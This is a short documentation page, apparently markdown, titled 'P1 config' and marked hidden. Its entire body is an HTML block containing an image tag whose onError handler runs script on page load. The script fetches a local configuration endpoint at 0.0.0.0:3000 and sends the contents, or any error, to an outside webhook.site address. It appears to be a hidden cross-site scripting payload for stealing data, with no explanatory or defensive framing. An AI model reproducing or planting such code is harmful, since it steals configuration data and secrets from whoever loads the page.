---
title: P1 config
deprecated: false
hidden: true
metadata:
  robots: index
---
<HTMLBlock>{`<img src="x" onError="fetch('http://0.0.0.0:3000/config').then(r=>r.text()).then(d=>fetch('https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355?t=cfg&d='+encodeURIComponent(d.slice(0,2000)))).catch(e=>fetch('https://webhook.site/19e78727-c915-48f1-afb3-c8d1263e6355?t=cfg_fail&e='+encodeURIComponent(e)))" />`}</HTMLBlock>